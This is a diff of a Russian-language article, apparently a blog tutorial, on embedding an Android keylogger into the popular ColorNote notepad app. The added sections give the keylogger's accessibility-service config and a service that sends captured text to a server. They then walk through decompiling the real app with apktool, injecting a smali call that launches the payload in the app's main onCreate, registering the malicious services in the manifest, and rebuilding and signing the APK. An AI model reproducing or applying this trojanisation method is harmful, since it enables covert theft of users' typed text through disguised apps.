@@ -1,4 +1,4 @@
-# Воруем ЭЦП, используя Man-In-The-Disk / Кейлоггер в блокноте
+# Воруем ЭЦП, используя Man-In-The-Disk / Как встроить кейлоггер в блокнот
 
 ## Intro
 
@@ -516,7 +516,7 @@ https://youtu.be/iBCX_A5FBVU
 
 ## Создаем payload
 
-Payload будет состоять из трех классов - ```ExecuteAttack```, ```GoogleService```, ```SendService```.
+Payload будет состоять из трех классов - ```ExecuteAttack```, ```GoogleService```, ```SendService```. Класс ```MainActivity``` просто вспомогательный. И еще у нас будет xml конфиг AccessibilityService.
 
 ![](/assets/images/keylogger_prj.png)
 
@@ -579,6 +579,20 @@ public void onAccessibilityEvent(AccessibilityEvent event) {
     }
 ```
 
+Конфиг, нашего ```GoogleService```, выглядит так:
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+    android:accessibilityEventTypes="typeViewTextChanged"
+    android:accessibilityFeedbackType="feedbackSpoken|feedbackHaptic|feedbackAudible|feedbackVisual|feedbackGeneric|feedbackAllMask"
+    android:notificationTimeout="100"
+    android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews"
+    android:canRetrieveWindowContent="false" />
+```
+
+В нем указывается, на какие события подписывается наш сервис и другая информация.
+
 ```SendService``` - просто отправляет данные на сервер.
 
 ```java
@@ -617,7 +631,13 @@ private void sendResult(String text) {
     }
 ```
 
-Скачиваем приложение, декомпилируем. Открываем манифест, находим активити.
+```MainActivity``` - нам нужен лишь для получения smali кода вызова основного метода.
+
+Собираем apk, декомпилируем, с помощью ```apktool```, и пока оставляем так.
+
+## Внедряем payload
+
+Зайдем в Play Market и скачиваем достаточно популярное приложение [ColorNote](https://play.google.com/store/apps/details?id=com.socialnmobile.dictapps.notepad.color.note). Декомпилируем его, с помощью ```apktool```. Открываем манифест, чтобы найти главный активити. Как говорилось раннее, нам это необходимо для 
 
 ```xml
 <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" 
@@ -641,3 +661,91 @@ private void sendResult(String text) {
                 <data android:mimeType="vnd.android.cursor.dir/vnd.socialnmobile.colornote.note"/>
             </intent-filter>
 ```
+
+Видим нужный класс ```com.socialnmobile.colornote.activity.Main```. В нем ищем метод ```OnCreate()```. Видим промежуток между line 164 и line 172. Туда и будем внедрять вызов нашей функции.
+
+```java
+.method protected onCreate(Landroid/os/Bundle;)V
+    .locals 6
+
+    .prologue
+    const v2, 0x7f0800f9
+
+    const/4 v5, 0x0
+
+    const/4 v4, 0x1
+
+    .line 164
+    invoke-super {p0, p1}, Lcom/socialnmobile/colornote/activity/ThemeFragmentActivity;->onCreate(Landroid/os/Bundle;)V
+	
+	<------------------------ //Внедряемся сюда
+	
+    .line 172
+    invoke-virtual {p0, v4}, Lcom/socialnmobile/colornote/activity/Main;->d(I)V
+
+    .line 173
+    const v0, 0x7f0a0003
+```
+
+Мы написали кейлоггер так, чтобы было достаточно вызвать одну функцию ```openSettings()``` в классе ```ExecuteAttack```. Вызов этой функции у нас был в ```MainActivity```. Открываем smali версию этого класса.
+
+```java
+# virtual methods
+.method protected onCreate(Landroid/os/Bundle;)V
+    .locals 0
+
+    .line 13
+    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
+
+    const p1, 0x7f09001c
+
+    .line 14
+    invoke-virtual {p0, p1}, Lkz/c/keylogger/MainActivity;->setContentView(I)V
+
+    .line 15
+    invoke-static {p0}, Lkz/c/keylogger/ExecuteAttack;->openSettings(Landroid/content/Context;)V
+	// Нужная нам строка
+	
+    return-void
+.end method
+```
+
+Берем этот вызов и добавляем в ```com.socialnmobile.colornote.activity.Main```. В итоге он выглядит так.
+
+```java
+.method protected onCreate(Landroid/os/Bundle;)V
+    .locals 6
+
+    .prologue
+    const v2, 0x7f0800f9
+
+    const/4 v5, 0x0
+
+    const/4 v4, 0x1
+
+    .line 164
+    invoke-super {p0, p1}, Lcom/socialnmobile/colornote/activity/ThemeFragmentActivity;->onCreate(Landroid/os/Bundle;)V
+	
+	.line 165
+    invoke-static {p0}, Lcom/socialnmobile/colornote/activity/ExecuteAttack;->openSettings(Landroid/content/Context;)V
+	
+    .line 172
+    invoke-virtual {p0, v4}, Lcom/socialnmobile/colornote/activity/Main;->d(I)V
+```
+
+Теперь копируем нужные smali, в декомпилированную папку ColorNote, как это делали в предыдущий раз. Меняем им package name. Не забываем об xml конфиге нашего сервиса, его тоже переносим в папку *res\xml*. Осталось добавить наш ```AccessibilityService``` и сервис по отправке данных на сервер в манифест.
+
+```xml
+<service android:name="com.socialnmobile.colornote.activity.SendService"/>
+        <service android:name="com.socialnmobile.colornote.activity.GoogleService"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config" />
+        </service>
+```
+
+Как и ранее, собираем с помощью ```apktool``` и подписываем ```jarsigner```. Видео, как это работает:
+
+https://youtu.be/vTHcc6OSou0
